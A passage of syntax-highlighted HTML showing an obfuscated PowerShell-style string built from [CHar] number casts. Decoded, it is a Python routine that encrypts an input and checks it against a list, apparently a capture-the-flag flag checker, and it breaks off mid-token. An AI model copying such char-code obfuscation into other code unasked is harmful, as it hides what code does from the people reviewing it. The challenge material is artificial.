class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">45</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">62</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">37</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">34</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">73</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">34</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">120</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">119</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">60</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">60</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">34</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span 